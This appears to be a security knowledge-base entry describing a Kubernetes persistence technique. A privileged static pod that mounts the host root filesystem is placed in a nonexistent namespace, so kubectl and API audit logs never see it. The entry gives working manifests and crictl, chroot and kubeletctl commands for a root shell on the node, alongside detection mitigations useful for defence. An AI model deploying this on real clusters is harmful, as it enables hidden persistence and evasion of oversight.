---
title: Rogue Static Pod Deployment
description: Deploying static pod manifests that bypass API server admission to run containers invisible to kubectl and API-based monitoring
category: offensive
phase: persistence
createdAt: 2026-05-11
impact: An attacker with root access to a Kubernetes node can run privileged containers that are permanently invisible to kubectl, produce no API server audit log entries for pod creation, and persist across kubelet restarts. The containers bypass Pod Security Admission policies, can mount the host filesystem, and can only be discovered via direct node-level inspection
mitigation:
  - Monitor the static pod manifest directory with a file integrity monitoring tool and alert on any new or modified files
  - Configure kubelet log alerting for the message "Failed creating a mirror pod". This is the only API-visible signal that a container is running without a mirror pod
  - Use a node-level runtime security tool (Falco, Tetragon) to detect container creation events that originate from the kubelet without a corresponding API server pod object
  - Restrict write access to `/etc/kubernetes/manifests` to root and verify this with regular permission audits on control plane and worker nodes
mitreTechniques:
  - T1610
  - T1543.005
  - T1564
tools:
  - crictl
references: |
  - [Kubelet Mirror Pod Behaviours](https://blog.iainsmart.co.uk/posts/2024-10-13-mirror-mirror/)
  - [Static Pods](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/)
  - [Mirror Pod](https://kubernetes.io/docs/reference/glossary/?all=true#term-mirror-pod)
---

The kubelet starts static pod containers directly through the container runtime before it ever contacts the API server. The **mirror pod** is the API object that makes the pod visible to `kubectl`. It is registered in a separate step after the container is already running. If the API server rejects the mirror pod creation, the rejection has no effect on the container. An attacker with root access to any node can write a static pod manifest that the kubelet starts immediately but the API server refuses to register, producing a running container with no API representation.

This is not a vulnerability in the Kubernetes codebase. It is a consequence of the kubelet's architecture: static pods are a node-level primitive that predates cluster-wide admission control. The gap is that the container runtime and admission control are two separate subsystems with no synchronization between them.

This technique assumes the attacker has already gained a root-level shell on a worker node, typically through a container escape, exposed kubelet API, or compromised SSH credentials.

## The attack sequence

The attacker writes a static pod manifest targeting a namespace that does not exist. The kubelet starts the container and repeatedly tries to register the mirror pod. Every attempt fails with a `namespace-not-found` error. The container runs indefinitely.

### Step 1: Locate the static pod manifest directory

The `staticPodPath` field in the KubeletConfiguration file specifies the directory the kubelet watches for static pod manifests. On kubeadm clusters, the kubelet config is at `/var/lib/kubelet/config.yaml`:

```bash
grep staticPodPath /var/lib/kubelet/config.yaml
```

```output
staticPodPath: /etc/kubernetes/manifests
```

Also record the node hostname. The kubelet appends the node hostname to the local pod name, which appears in `crictl` output:

```bash
cat /etc/hostname
```

```output
worker-1
```

### Step 2: Write the hidden pod manifest

Create a manifest targeting a namespace that does not exist in the cluster. The kubelet starts the container immediately on detecting the new file via inotify filesystem watch, then tries and fails to create the mirror pod. The pod spec below mounts the host root filesystem and runs privileged, configurations that would be blocked by any reasonable admission policy:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hidden-pod
  namespace: nonexistent-ns
spec:
  hostPID: true
  containers:
  - name: hidden-pod
    image: alpine
    command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
```

Write the manifest to the static pod directory:

```bash
cp hidden-pod.yaml /etc/kubernetes/manifests/hidden-pod.yaml
```

### Step 3: Verify the container is running

Check the container runtime directly. The kubelet names the local pod sandbox using the node hostname as a suffix:

```bash
crictl pods | grep hidden-pod
```

```output
89d585212ff8b  5 seconds ago   Ready   hidden-pod-worker-1   nonexistent-ns  0  (default)
```

```bash
crictl ps | grep hidden-pod
```

```output
78c94040ffd50  alpine  5 seconds ago  Running  hidden-pod  0  89d585212ff8b  hidden-pod-worker-1
```

The container is running with `privileged: true` and the host filesystem mounted at `/host`.

### Step 4: Confirm kubectl cannot see it

```bash
kubectl get pods -A | grep hidden-pod
```

```output

```

No output. The pod does not exist in the API server and does not appear under any namespace because no mirror pod was ever created. The kubelet retries mirror pod registration on a backoff interval but the repeated rejections have no effect on the running container.

### Step 5: Execute commands in the hidden container

`kubectl exec` has no pod object to target. Use `crictl` directly on the node:

```bash
CONTAINER_ID=$(crictl ps | awk '/hidden-pod/ {print $1}')
crictl exec -it "$CONTAINER_ID" /bin/sh
```

The shell opens inside the privileged container. With the host filesystem at `/host`, a `chroot /host /bin/sh` gives a shell rooted at the node:

```bash
chroot /host /bin/sh
```

Alternatively, kubeletctl can interact with the container via the kubelet's HTTPS API on port 10250. This works even when the attacker can reach port 10250 but lacks shell access to the node:

```bash
kubeletctl pods --server 127.0.0.1
kubeletctl exec -n nonexistent-ns -p hidden-pod-worker-1 -c hidden-pod --server 127.0.0.1 -- id
```

```output
uid=0(root) gid=0(root) groups=0(root)
```

## Persistence and cleanup

The static pod manifest is read by the kubelet on every startup. A node reboot or kubelet restart recreates the container automatically from the file on disk without any further attacker action.

`kubectl delete pod` has no target. The only way to stop the container is to remove the manifest file from the node:

```bash
rm /etc/kubernetes/manifests/hidden-pod.yaml
```

